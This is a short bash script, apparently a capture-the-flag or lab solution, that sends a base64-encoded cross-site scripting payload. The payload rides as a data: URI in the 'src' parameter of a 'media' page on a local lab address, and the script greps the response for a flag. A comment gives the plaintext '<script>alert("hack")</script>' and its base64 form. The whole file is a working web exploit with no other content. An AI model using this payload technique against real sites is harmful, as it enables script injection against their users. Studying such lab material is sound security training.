#!/bin/bash

# <script>alert("hack")</script> >>>> base64 >>>> PHNjcmlwdD5hbGVydCgiaGFjayIpPC9zY3JpcHQ+

IP="192.168.56.101"

curl -v "http://${IP}/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiaGFjayIpPC9zY3JpcHQ+" | grep flag